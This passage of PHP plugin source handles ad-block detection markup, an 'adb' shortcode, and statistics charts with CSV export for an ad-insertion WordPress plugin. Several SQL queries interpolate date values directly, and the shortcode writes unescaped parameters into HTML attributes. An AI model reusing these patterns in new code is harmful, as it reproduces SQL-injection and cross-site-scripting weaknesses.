              $fallback_obj->w3tc_code .= ' $ai_code = str_replace (\'[#AI_DATA_TRACKING#]\', base64_encode (\'[' . $fallback_tracking_block . ',\'.$ai_index.\']\'), $ai_code);';
              $obj->additional_code_after = $fallback_obj->generate_html_from_w3tc_code ();
            }

            $ad_inserter_globals [$globals_name] --;
          } else $new_processed_code = $processed_code;

        break;
      case AI_ADB_BLOCK_ACTION_SHOW:
        $no_adb_label = '';
        $adb_label    = '';

        // ???
        // By default prevent tracking
//        $obj->code_version   = '""';
//        $obj->tracking_index = '""';

        if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
          $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
          $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

          $no_adb_label =
            $debug_adb_off->adb_visible_section_start () .
            $debug_adb_off->invisible_start () .
            $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter')) .
            $debug_adb_off->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
            $debug_adb_off->invisible_end () .
            $debug_adb_off->adb_visible_section_end ();

          $adb_label =
            $debug_adb_on->invisible_start () .
            $debug_adb_on->center_bar (__('AD BLOCKING', 'ad-inserter')) .
            $debug_adb_on->invisible_end ();

        }
        $block_counter = isset ($ad_inserter_globals [AI_BLOCK_COUNTER_NAME . $obj->number]) ? $ad_inserter_globals [AI_BLOCK_COUNTER_NAME . $obj->number] : 0;

        $new_processed_code =
          $no_adb_label .
//          "<div class='ai-adb-show' style='visibility: hidden; display: none;' data-ai-tracking='" . base64_encode ("[{$obj->number},\"\",\"{$obj->get_ad_name ()}\",\"{$obj->version_name}\",{$block_counter}]") . "' data-ai-debug='$obj->number'>\n" .
          "<div class='ai-adb-show' style='visibility: hidden; display: none;' data-ai-tracking='" . base64_encode ("[{$obj->number},{$obj->code_version},\"{$obj->get_ad_name ()}\",\"{$obj->version_name}\",{$block_counter}]") . "' data-ai-debug='$obj->number'>\n" .
          $adb_label .
          $processed_code .
          "</div>\n";

        break;
      case AI_ADB_BLOCK_ACTION_HIDE:
        $no_adb_label = '';
        $adb_label    = '';

        if (($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_BLOCKS) != 0) {
          $debug_adb_on   = new ai_block_labels ('ai-debug-adb-status on');
          $debug_adb_off  = new ai_block_labels ('ai-debug-adb-status off');

          $adb_label =
            $debug_adb_on->adb_hidden_section_start () .
            $debug_adb_on->invisible_start () .
            $debug_adb_on->center_bar (__('AD BLOCKING', 'ad-inserter')) .
            $debug_adb_on->message (__('BLOCK INSERTED BUT NOT VISIBLE', 'ad-inserter')) .
            $debug_adb_on->invisible_end () .
            $debug_adb_on->adb_hidden_section_end ();

          $no_adb_label =
            $debug_adb_off->invisible_start () .
            $debug_adb_off->center_bar (__('NO AD BLOCKING', 'ad-inserter')) .
            $debug_adb_off->invisible_end ();
        }

        $new_processed_code =
          $adb_label .
          "<div class='ai-adb-hide' data-ai-debug='$obj->number'>\n" .
          $no_adb_label .
          $processed_code .
          "</div>\n";
        break;
      default:
        return  $processed_code;
        break;
    }

    return $new_processed_code;
  }
}

function ai_shortcode ($parameters) {
  if (($adb = trim ($parameters ['adb'])) != '') {
    $css_attr = "";
    if (($css = trim ($parameters ['css'])) != '') {
      $css_attr = " data-css='$css'";
    }
    $text_attr = "";
    if (($text = trim ($parameters ['text'])) != '') {
      $text_attr = " data-text='$text'";
    }
    $selectors_attr = "";
    if (($selectors = trim ($parameters ['selectors'])) != '') {
      $selectors_attr = " data-selectors='$selectors'";
    }
    switch ($adb) {
      case 'hide':
        return  "<span class='" . AI_ADB_CONTENT_CSS_BEGIN ."'{$selectors_attr}></span>";
        break;
      case 'hide-end':
        return  "<span class='" . AI_ADB_CONTENT_CSS_END ."'></span>";
        break;
      case 'css':
        return  "<span class='" . AI_ADB_CONTENT_CSS_BEGIN ."'{$css_attr}{$selectors_attr}></span>";
        break;
      case 'css-end':
        return  "<span class='" . AI_ADB_CONTENT_CSS_END ."'></span>";
        break;
      case 'delete':
        return  "<span class='" . AI_ADB_CONTENT_DELETE_BEGIN ."'{$selectors_attr}></span>";
        break;
      case 'delete-end':
        return  "<span class='" . AI_ADB_CONTENT_DELETE_END ."'></span>";
        break;
      case 'replace':
        return  "<span class='" . AI_ADB_CONTENT_REPLACE_BEGIN ."'{$text_attr}{$css_attr}{$selectors_attr}></span>";
        break;
      case 'replace-end':
        return  "<span class='" . AI_ADB_CONTENT_REPLACE_END ."'></span>";
        break;
    }
  }
}

function generate_charts ($block, $start_date, $end_date, $adb, $delete, $single_version, $csv = false) {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (is_numeric ($block) && $block >= 0 && $block <= 96 && isset ($start_date) && isset ($end_date) && $start_date <= $end_date) {

    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);

    $date_start = $start_date;
    $date_end   = $end_date;

    $date_end_time    = strtotime ($date_end);
    $date_start_time  = strtotime ($date_start);

    $pageview_statistics = $block == 0;

    $show_single_version = isset ($single_version) && is_numeric ($single_version) && $single_version >= 0 && $single_version <= 255;
    if ($single_version == AI_ADB_FLAG_BLOCKED) $adb = 1;
    if ($show_single_version) {
      $single_version = (int) $single_version;
    }

    if (!$pageview_statistics) {
      $obj = $block_object [$block];
      $block_name = $obj->get_ad_name ();
    } else $block_name = __("Pageviews", 'ad-inserter');

    $adb_statistics = isset ($adb) && $adb == 1 || $pageview_statistics && $ai_wp_data [AI_ADB_DETECTION];

    $message = '';

    if (isset ($delete) && $delete == 1) {

      $version_quuery = '';
      $version_text = '';
      if ($show_single_version) {
        $single_version_blocked = $single_version | AI_ADB_FLAG_BLOCKED;

        $version_quuery = " AND (version = $single_version OR version = $single_version_blocked) ";
        $version_text = "-{$single_version}";
      }

      if ($date_start == '' && $date_end == '') {
        $wpdb->query ("DELETE FROM " . AI_STATISTICS_DB_TABLE . " WHERE block = " . $block . $version_quuery);
        $message = sprintf (__("All statistics data for block %s deleted", 'ad-inserter'), $block.$version_text);
      } else {
          if (abs ($date_start_time - time ()) < 800 * 24 * 3600 && abs ($date_end_time - time ()) < 800 * 24 * 3600) {
            $wpdb->query ("DELETE FROM " . AI_STATISTICS_DB_TABLE . " WHERE block = " . $block . " AND date >= '$date_start' AND date <= '$date_end' ".$version_quuery);
            $message = sprintf (__("Statistics data between %s and %s deleted", 'ad-inserter'), $date_start, $date_end);
          }
        }
    }

    if ($date_start_time < time () - 800 * 24 * 3600) {
      $date_start = $today;
      $date_start_time  = strtotime ($date_start);
    }

    if ($date_end_time < time () - 800 * 24 * 3600) {
      $date_end = $date_end;
      $date_end_time    = strtotime ($date_end);
    }

    $days = ($date_end_time - $date_start_time) / 24 / 3600 + 1;

    if ($days > 365 ) {
      $days = 365;
      $date_start = date ("Y-m-d", $date_end_time - 365 * 24 * 3600);
      $date_start_time  = strtotime ($date_start);
    } elseif ($days < 1 ) {
      $days = 1;
      $date_end = date ("Y-m-d", $date_start_time - 1 * 24 * 3600);
      $date_end_time  = strtotime ($date_end);
    }

    $date_start = date ("Y-m-d", strtotime ($date_start) - AI_STATISTICS_AVERAGE_PERIOD * 24 * 3600);

    $chart_data = array ();
    $day_time = $date_start_time - AI_STATISTICS_AVERAGE_PERIOD * 24 * 3600;
    $days_to_do = $days + AI_STATISTICS_AVERAGE_PERIOD;
    while ($days_to_do != 0) {
      $chart_data [date ("Y-m-d", $day_time)] = array (0, 0);
      $day_time += 24 * 3600;
      $days_to_do --;
    }

    $first_date = $date_end;
    $last_date  = $date_start;

    $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block . " AND date >= '$date_start' AND date <= '$date_end' ", ARRAY_N);

    $versions = array ();
    $chart_data_total = $chart_data;
    $chart_data_versions = array ();

    if (isset ($results [0])) {

      foreach ($results as $result) {
        $version = $result [2] & AI_ADB_VERSION_MASK;

        if ($show_single_version && $single_version != AI_ADB_FLAG_BLOCKED && !$pageview_statistics) {
          if ($adb_statistics != (($result [2] & AI_ADB_FLAG_BLOCKED) != 0)) continue;
        } else

        if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) {
          if (!$pageview_statistics) {
            if ($adb_statistics) $version = AI_ADB_FLAG_BLOCKED; else continue;
          }
        }

        if ($show_single_version) {
          if ($version != $single_version) continue;
        }

        if (!in_array ($version, $versions)) {
          $versions []= $version;
          $chart_data_versions [$version] = $chart_data;
        }
      }

      usort ($versions, "compare_versions");
      ksort ($chart_data_versions);

      foreach ($results as $result) {
        $version = $result [2] & AI_ADB_VERSION_MASK;

        $date = $result [3];
        $views = $result [4];
        $clicks = $result [5];

        if ($show_single_version && $single_version != AI_ADB_FLAG_BLOCKED && !$pageview_statistics) {
          if ($adb_statistics != (($result [2] & AI_ADB_FLAG_BLOCKED) != 0)) continue;
        } else


        if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) {
          if ($pageview_statistics) {
            $clicks = $views;
          } else {
            if ($adb_statistics) $version = AI_ADB_FLAG_BLOCKED; else continue;
          }
        }

        if ($show_single_version) {
          if ($version != $single_version) continue;
        }

//          $result [4] = rand (4, 10);
//          $result [5] = rand (4, 10);

        if ($date < $first_date) $first_date = $date;
        if ($date > $last_date) $last_date = $date;
        if (isset ($chart_data_total [$date])) {
          $chart_data_total [$date] = array ($chart_data_total [$date][0] + $views, $chart_data_total [$date][1] + $clicks);
        }
        if (isset ($chart_data_versions [$version][$date])) {
          $chart_data_versions [$version][$date] = array ($chart_data_versions [$version][$date][0] + $views, $chart_data_versions [$version][$date][1] + $clicks);
        }
      }
    }

    $show_versions = !$show_single_version && (count ($versions) > 1 || (count ($versions) == 1 && $versions [0] != 0));

    $version_name = '';

    if ($show_versions) {

      $processed_chart_data_versions = array ();
      foreach ($chart_data_versions as $version => $chart_data_version) {
        $impressions          = array ();
        $clicks               = array ();
        $ctr                  = array ();
        $average_impressions  = array ();
        $average_clicks       = array ();
        $average_ctr          = array ();

        calculate_chart_data ($chart_data_version, $date_start, $date_end, $first_date, $impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);
        $processed_chart_data_versions [$version] = array ($impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);
      }

      $only_blocked_version = $adb_statistics && count ($versions) == 2 && $versions [0] == AI_ADB_FLAG_BLOCKED && $versions [1] == 0;

      if (!$pageview_statistics) {
        $code_generator = new ai_code_generator ();
        $obj = $block_object [$block];
        $rotation_data = $code_generator->import_rotation ($obj->get_ad_data(), true);
        $rotation_data = $rotation_data ['options'];
      }

      $legend_data = array ();
      $legends = array ();
      foreach ($versions as $version) {
        $legend_index_for_name = $version;

        if (!$pageview_statistics && $version != 0 && $version != AI_ADB_FLAG_BLOCKED) {
          foreach ($rotation_data as $rotation_data_index => $rotation_data_version) {
            if (isset ($rotation_data_version ['index'])) {
              $option_index = (int) $rotation_data_version ['index'];
              if ($option_index == $version) {
                $legend_index_for_name = $rotation_data_index + 1;
                break;
              }
            }
          }
        }

        if     ($version == 0)                    $legend = $pageview_statistics ? _x('Unknown', 'Version', 'ad-inserter')         : ($only_blocked_version ? _x('DISPLAYED', 'Times', 'ad-inserter') : __('No version', 'ad-inserter'));
        elseif ($version == AI_ADB_FLAG_BLOCKED)  $legend = $pageview_statistics ? __('Ad Blocking', 'ad-inserter')                : _x('BLOCKED', 'Times', 'ad-inserter');
        else                                      $legend = $pageview_statistics ? get_viewport_name ($version) : (
//          isset ($rotation_data [$version - 1]['name']) && trim ($rotation_data [$version - 1]['name']) != '' ? str_replace ("'", "&#39;", $rotation_data [$version - 1]['name']) : chr (ord ('A') + $version - 1)
          isset ($rotation_data [$legend_index_for_name - 1]['name']) && trim ($rotation_data [$legend_index_for_name - 1]['name']) != '' ? str_replace ("'", "&#39;", $rotation_data [$legend_index_for_name - 1]['name']) : chr (ord ('A') + $legend_index_for_name - 1)
        );

        $legends [] = $legend;

        // version 1 uses serie2 color
        $legend_data ['serie'.($version + 1)] = $legend;
      }
    }
    elseif ($show_single_version) {
      $only_blocked_version = $adb_statistics && ($single_version == AI_ADB_FLAG_BLOCKED || $single_version == 0);

      if (!$pageview_statistics) {
        $code_generator = new ai_code_generator ();
        $obj = $block_object [$block];
        $rotation_data = $code_generator->import_rotation ($obj->get_ad_data(), true);
        $rotation_data = $rotation_data ['options'];
      }

      if     ($single_version == 0)                     $version_name = $pageview_statistics ? _x('Unknown', 'Version', 'ad-inserter')  : ($only_blocked_version ? _x('DISPLAYED', 'Times', 'ad-inserter') : __('No version', 'ad-inserter'));
      elseif ($single_version == AI_ADB_FLAG_BLOCKED)   $version_name = $pageview_statistics ? __('Ad Blocking', 'ad-inserter')         : _x('BLOCKED', 'Times', 'ad-inserter');
      else {
        $version_name = $pageview_statistics ? get_viewport_name ($single_version)      : (isset ($rotation_data [$single_version - 1]['name']) && trim ($rotation_data [$single_version - 1]['name']) != '' ? str_replace ("'", "&#39;", $rotation_data [$single_version - 1]['name']) : chr (ord ('A') + $single_version - 1));
        if ($adb_statistics) {
          $version_name .= ' - ' . _x('BLOCKED', 'Times', 'ad-inserter');
        }
      }
    }


    $impressions          = array ();
    $clicks               = array ();
    $ctr                  = array ();
    $average_impressions  = array ();
    $average_clicks       = array ();
    $average_ctr          = array ();

    calculate_chart_data ($chart_data_total, $date_start, $date_end, $first_date, $impressions, $clicks, $ctr, $average_impressions, $average_clicks, $average_ctr);

    $labels = array ();
    $org_labels = array ();
    foreach ($chart_data as $date => $data) {
      $org_labels []= $date;

      $date_elements = explode ('-', $date);

      $page_width = 690;

      if ($date_elements [2] == '01') {
        if ($date_elements [1] == '01') {
          $labels [] = $date_elements [0];
        } else {
            $labels [] = date ("M", mktime (0, 0, 0, $date_elements [1], 1, 2017));
          }
      } elseif ($page_width / $days > 20) {
          $labels [] = $date_elements [2];
        } elseif ($page_width / $days > 10) {
            if ($date_elements [2] % 5 == 0) {
              $labels [] = $date_elements [2];
            } else $labels [] = '';
        } elseif ($page_width / $days > 4) {
            $labels [] = '';
        } else $labels [] = '';
    }

    $labels               = array_slice ($labels, - $days);
    $org_labels           = array_slice ($org_labels, - $days);

    $impressions          = array_slice ($impressions, - $days);
    $clicks               = array_slice ($clicks, - $days);
    $ctr                  = array_slice ($ctr, - $days);
    $average_impressions  = array_slice ($average_impressions, - $days);
    $average_clicks       = array_slice ($average_clicks, - $days);
    $average_ctr          = array_slice ($average_ctr, - $days);

    $impressions_max_value  = chart_range (max (max ($impressions), max ($average_impressions)), true);
    $clicks_max_value       = chart_range (max (max ($clicks), max ($average_clicks)), true);
    $ctr_max_value          = chart_range (max (max ($ctr), max ($average_ctr)), false);

    $total_impressions  = array_sum ($impressions);
    $total_clicks       = array_sum ($clicks);
    $total_ctr          = $total_impressions != 0 ? number_format (100 * $total_clicks / $total_impressions, 2, '.', '') : 0;

    $impressions_name   = $pageview_statistics ? __('Pageviews', 'ad-inserter')              : __('Impressions', 'ad-inserter');
    $clicks_chart_name  = $pageview_statistics ? __('Ad Blocking', 'ad-inserter')            : __('Clicks', 'ad-inserter');
    $clicks_label_name  = $pageview_statistics ? __('events', 'ad-inserter')                 : __('Clicks', 'ad-inserter');
    $ctr_chart_name     = $pageview_statistics ? __('Ad Blocking Share', 'ad-inserter') . ' [%]'  : /* translators: CTR as Click Through Rate */ __('CTR', 'ad-inserter') . ' [%]';

    if ($show_versions) {
      $impressions_          = array ();
      $clicks_               = array ();
      $ctr_                  = array ();
      $average_impressions_  = array ();
      $average_clicks_       = array ();
      $average_ctr_          = array ();

      $impressions_share     = array ();
      $clicks_share          = array ();
      $ctr_share             = array ();
      $tooltips              = array ();

      $impressions_max_value_ = 0;
      $clicks_max_value_      = 0;
      $ctr_max_value_         = 0;

      $average_impressions_max_value = 0;
      $average_clicks_max_value      = 0;
      $average_ctr_max_value         = 0;

      $total_impressions     = 0;
      $total_clicks          = 0;

      foreach ($versions as $version) {
        $processed_chart_data  = $processed_chart_data_versions [$version];

        $impressions_          [$version] = array_slice ($processed_chart_data [0], - $days);
        $average_impressions_  [$version] = array_slice ($processed_chart_data [3], - $days);

        $impressions_sum      = array_sum ($impressions_ [$version]);
        $total_impressions    += $impressions_sum;
        $impressions_share    [] = $impressions_sum;

        if ($version == AI_ADB_FLAG_BLOCKED) {
          $clicks_          = array_fill (0, $days, null);
          $ctr_             = array_fill (0, $days, null);
          $average_clicks_  = array_fill (0, $days, null);
          $average_ctr_     = array_fill (0, $days, null);

          $clicks_sum           = 0;
        } else {
            $clicks_               [$version] = array_slice ($processed_chart_data [1], - $days);
            $ctr_                  [$version] = array_slice ($processed_chart_data [2], - $days);
            $average_clicks_       [$version] = array_slice ($processed_chart_data [4], - $days);
            $average_ctr_          [$version] = array_slice ($processed_chart_data [5], - $days);

            $clicks_sum           = array_sum ($clicks_ [$version]);
          }

        $total_clicks         += $clicks_sum;
        $clicks_share         [] = $clicks_sum;
        $ctr_value               = $impressions_sum != 0 ? (float) number_format (100 * $clicks_sum / $impressions_sum, 2, '.', '') : 0;
        $ctr_share            [] = $ctr_value;

        $impressions_max_value_          = max ($impressions_max_value_, max ($impressions_ [$version]));
        $average_impressions_max_value  = max ($average_impressions_max_value, max ($average_impressions_ [$version]));

        if ($version == AI_ADB_FLAG_BLOCKED) {
            $clicks_max_value_           = 0;
            $ctr_max_value_              = 0;
            $average_clicks_max_value   = 0;
            $average_ctr_max_value      = 0;
        } else {
            $clicks_max_value_           = max ($clicks_max_value_, max ($clicks_ [$version]));
            $ctr_max_value_              = max ($ctr_max_value_, max ($ctr_ [$version]));
            $average_clicks_max_value   = max ($average_clicks_max_value, max ($average_clicks_ [$version]));
            $average_ctr_max_value      = max ($average_ctr_max_value, max ($average_ctr_ [$version]));
          }
      }
    }

    if (ai_settings_check ('AD_INSERTER_REPORTS')) {
      if ($csv) {

        $block_name = $block;

        if ($show_single_version) {
          switch ($single_version) {
            case 0:
              if ($only_blocked_version) {
                $block_name .= '-D';
              } else $block_name .= '-0';
              break;
            case AI_ADB_FLAG_BLOCKED:
              $block_name .= '-B';
              break;
            default:
              $block_name .= '-' . $single_version;
              break;
          }
        }

        $filename = 'ad_inserter_pro_block_' . $block_name . '_' . $start_date . '_' . $end_date . '.csv';

        $csv_file =
//        "\xEF\xBB\xBF" .
          __ ('Date', 'ad-inserter') .
          ',' . $impressions_name;

        if (!$pageview_statistics) {
          $csv_file .=
            ',' . $clicks_chart_name .
            ',' . $ctr_chart_name;
        }

        if ($show_versions) {
          foreach ($versions as $version_index => $version) {
            $csv_file .= ',' . $legends [$version_index] . ' ' . $impressions_name;
          }
          foreach ($versions as $version_index => $version) {
            $csv_file .= ',' . $legends [$version_index] . ' ' . $clicks_chart_name;
            $csv_file .= ',' . $legends [$version_index] . ' ' . $ctr_chart_name;
          }
        }

        $csv_file .= "\n";

        foreach ($org_labels as $index => $org_label) {
          $csv_file .= $org_label;
          $csv_file .= ',' . $impressions [$index];

          if (!$pageview_statistics) {
            $csv_file .= ',' . $clicks [$index];
            $csv_file .= ',' . (is_numeric ($ctr [$index]) ? number_format ($ctr [$index], 2, '.', '') : '');
          }

          if ($show_versions) {
            foreach ($versions as $version) {
              $csv_file .= ',' . $impressions_ [$version][$index];
            }
            foreach ($versions as $version) {
              $csv_file .= ',' . $clicks_ [$version][$index];
              $csv_file .= ',' . (is_numeric ($ctr_ [$version][$index]) ? number_format ($ctr_ [$version][$index], 2, '.', '') : '');
            }
          }

          $csv_file .= "\n";
        }

        header ('Content-Description: Statistics export');
        header ('Content-Type: text/plain; charset=utf-8');
        header ('Content-Disposition: attachment; filename='.$filename);
        header ('Content-Transfer-Encoding: binary');
        header ('Expires: 0');
        header ('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header ('Pragma: public');
        header ('Content-Length: ' . strlen ($csv_file));

        echo $csv_file;

        return;
      }
    }

    if ($message != '') echo "  <div style='margin: 0 0 10px; text-align: center; font-size: 14px; color: #888;'>$message</div>\n";

    $pdf_page_break = "    <span class='ai-statistics-page-break'></span>";
    $pdf_break      = "    <div class='ai-statistics-export-data'></div>";
    $pdf_legend     = "    <span class='ai-statistics-legend'></span>";
    $pdf_content    = "    <span class='ai-statistics-content'></span>";
    $date_format = get_option ('date_format');
    if ($ai_wp_data [AI_DISABLE_TRANSLATION]) {
      $date_start_text = date ($date_format, $date_start_time);
      $date_end_text   = date ($date_format, $date_end_time);
    } else {
      $date_start_text = date_i18n ($date_format, $date_start_time);
      $date_end_text   = date_i18n ($date_format, $date_end_time);
    }

    if (ai_settings_check ('AD_INSERTER_REPORTS')) {
      $rewrite_found = ai_public_report_rewrite_found ();

      // TODO: use data from connected website
      $home_url = home_url ();
      $site_url = site_url ();

//      $public_url = $rewrite_found ? '/ai-statistics-report-' : '/wp-admin/admin-ajax.php?action=ai_ajax&ai-report=';
      $public_url = $rewrite_found ? '/ai-statistics-report-' : str_replace ($home_url, '', $site_url) . '/wp-admin/admin-ajax.php?action=ai_ajax&ai-report=';

      $adb_value = isset ($adb) && $adb == 1 ? '1' : '0';
      $report_data = $start_date . $end_date . sprintf ('%02d', $block);

      $version_data = '';

      if ($show_single_version) {
        $version_data = sprintf ("%03d", $single_version);
      }

      $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

      $public_report_data = json_encode (array (home_url () . $public_url . $report_prefix, $report_data, $adb_value, $version_data));

      echo "  <span class='ai-statistics-export-data ai-public-report' data-report='$public_report_data'></span>";
    }

    $pdf_page_title = "  <h1 class='ai-statistics-export-data ai-report-name'>$block_name</h1>\n";

    if ($version_name == '') {
      $pdf_page_title .= "  <div class='ai-statistics-export-data'></div>\n";
    }

    echo $pdf_page_title;

    echo "  <span class='ai-statistics-export-data ai-date-range-text'>$date_start_text &ndash; $date_end_text</span>";
    echo "  <span class='ai-statistics-export-data ai-date-range'>{$date_start}_{$date_end}</span>";

    echo "  <div class='ai-chart-container'>\n";
    if ($version_name != '') {
      echo "  <div class='ai-chart-version-label'>$version_name</div><div class='ai-statistics-export-data'></div>\n";
    }
    echo "  <div class='ai-chart-label'>$impressions_name: $total_impressions</div>\n";
    echo "  <div class='ai-chart not-configured' data-template='ai-impressions' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($impressions), "' data-values-2='", json_encode ($average_impressions), "' data-max='", json_encode ((float) $impressions_max_value), "'></div>\n";
    echo "  </div>\n";

    if (!$pageview_statistics) {
      echo $pdf_break;

      echo "  <div class='ai-chart-container'><div class='ai-chart-label'>", __('Clicks', 'ad-inserter'), ": $total_clicks</div>\n";
      echo "  <div class='ai-chart not-configured' data-template='ai-clicks' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($clicks), "' data-values-2='", json_encode ($average_clicks), "' data-max='", json_encode ((float) $clicks_max_value), "'></div>\n";
      echo "  </div>\n";

      echo $pdf_break;
                                                                             // translators: CTR as Click Through Rate
      echo "  <div class='ai-chart-container'><div class='ai-chart-label'>", __('CTR', 'ad-inserter'), ": $total_ctr %</div>\n";
      echo "  <div class='ai-chart not-configured' data-template='ai-ctr' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($ctr), "' data-values-2='", json_encode ($average_ctr), "' data-max='", json_encode ((float) $ctr_max_value), "'></div>\n";
      echo "  </div>\n";
    }

    if ($show_versions) {

      foreach ($versions as $index => $version) {
        $impressions_percentage = $total_impressions != 0 ? (float) number_format (100 * $impressions_share [$index] / $total_impressions, 2, '.', '') : 0;
        $clicks_percentage      = $total_clicks      != 0 ? (float) number_format (100 * $clicks_share      [$index] / $total_clicks, 2, '.', '') : 0;
        $ctr_percentage         = $total_clicks      != 0 ? (float) number_format (100 * $clicks_share      [$index] / $total_clicks, 2, '.', '') : 0;

        $tooltips_impressions [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$impressions_share [$index]} " .
          ($pageview_statistics ? _n ('pageviews', 'pageviews', $impressions_share [$index], 'ad-inserter') : _n ('impressions', 'impressions', $impressions_share [$index], 'ad-inserter')) .
          "</div><div class=\"percentage\">$impressions_percentage%</div></div>";

        $tooltips_clicks      [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$clicks_share [$index]} " .
          ($pageview_statistics ? _n ('event', 'events', $clicks_share [$index], 'ad-inserter')  : _n ('click', 'clicks', $clicks_share [$index], 'ad-inserter')) .
          "</div><div class=\"percentage\">$clicks_percentage%</div></div>";

        $tooltips_ctr         [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$ctr_share [$index]}%</div></div>";
      }

      $impressions_max_value_          = chart_range ($impressions_max_value_, true);
      $clicks_max_value_               = chart_range ($clicks_max_value_, true);
      $ctr_max_value_                  = chart_range ($ctr_max_value_, false);
      $average_impressions_max_value  = chart_range ($average_impressions_max_value, true);
      $average_clicks_max_value       = chart_range ($average_clicks_max_value, true);
      $average_ctr_max_value          = chart_range ($average_ctr_max_value, false);


      echo $pdf_break;

      echo "      <table style='margin: 8px 0;'>\n";
      echo "      <tbody>\n";
      echo "      <tr>\n";

      echo "      <td><div class='ai-chart-container versions'>\n";
      if ($total_impressions != 0) {
        echo "        <div class='ai-chart-label'>$impressions_name</div>\n";
        echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($impressions_share), "' data-max='", chart_range (max ($impressions_share), true), "' data-tooltips='", json_encode ($tooltips_impressions), "' data-tooltip-height='55' data-colors='", json_encode ($versions), "'></div>\n";
      }
      echo "      </div></td>\n";
      $columns = 1;

      if (!$only_blocked_version && !$pageview_statistics || $pageview_statistics && $adb_statistics) {
        echo "      <td><div class='ai-chart-container versions'>\n";
        if ($total_clicks != 0) {
          echo "        <div class='ai-chart-label'>$clicks_chart_name</div>\n";
          echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($clicks_share), "' data-max='", chart_range (max ($clicks_share), true), "' data-tooltips='", json_encode ($tooltips_clicks), "' data-tooltip-height='55' data-colors='", json_encode ($versions), "'></div>\n";
        }
        echo "      </div></td>\n";
        $columns ++;
      }

      if (!$only_blocked_version && !$pageview_statistics || $pageview_statistics && $adb_statistics) {
        echo "      <td><div class='ai-chart-container versions'>\n";
        if ($total_clicks != 0) {
          echo "        <div class='ai-chart-label'>$ctr_chart_name</div>\n";
          echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($ctr_share), "' data-tooltips='", json_encode ($tooltips_ctr), "' data-tooltip-height='38' data-colors='", json_encode ($versions), "'></div>\n";
        }
        echo "      </div></td>\n";
        $columns ++;
      }

      while ($columns < 3) {
        echo "      <td> </td>\n";
        $columns ++;
      }

      echo "      </tr>\n";
      echo "      </tbody>\n";
      echo "      </table>\n";


      echo $pdf_break;

      echo "    <div class='ai-chart-container legend'>\n";

?>
      <span class="ai-toolbar-button text no-print" style="position: absolute; top: 0px; right: 5px; z-index: 202;">
        <input type="checkbox" value="0" style="display: none;" />
        <label class="checkbox-button ai-version-charts-button not-configured" title="Toggle detailed statistics">Details</label>
      </span>
<?php

      echo "      <div class='ai-chart ai-chart-legend not-configured' data-template='ai-versions-legend' data-labels='", json_encode ($labels);
      foreach ($processed_chart_data_versions as $version => $processed_chart_data) {
        echo  "' data-values-", $version + 1, "='", json_encode (array ());
      }
      echo "' data-block='", $block, "' data-versions='", json_encode ($versions), "' data-legend='", json_encode ($legend_data), "'></div>\n";
      echo "    </div>\n";


      echo $pdf_page_break;

      echo $pdf_page_title;
      echo $pdf_content;


      echo "    <div id='ai-version-charts-{$block}' class='ai-version-charts' style='display: none;'", ">\n";

      echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$impressions_name</div>\n";
      echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
      foreach ($impressions_ as $version => $impressions_data) {
        echo  "' data-values-", $version + 1, "='", json_encode ($impressions_data);
      }
      echo "' data-max='", json_encode ($impressions_max_value_), "'></div>\n";
      echo "      </div>\n";

      echo $pdf_break;

      echo "      <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Pageviews / Impressions', 'ad-inserter'), " $impressions_name</div>\n";
      echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
      foreach ($average_impressions_ as $version => $average_impressions_data) {
        echo  "' data-values-", $version + 1, "='", json_encode ($average_impressions_data);
      }
      echo "' data-max='", json_encode ($average_impressions_max_value), "'></div>\n";
      echo "      </div>\n";

      if (!$only_blocked_version || $pageview_statistics) {
        echo $pdf_break;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$clicks_chart_name</div>\n";
        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($clicks_ as $version => $clicks_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($clicks_data);
        }
        echo "' data-max='", json_encode ($clicks_max_value_), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Ad Blocking / Clicks', 'ad-inserter'), " $clicks_chart_name</div>\n";
        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($average_clicks_ as $version => $average_clicks_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($average_clicks_data);
        }
        echo "' data-max='", json_encode ($average_clicks_max_value), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;
        echo $pdf_legend;
        echo $pdf_page_break;

        echo $pdf_page_title;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$ctr_chart_name</div>\n";
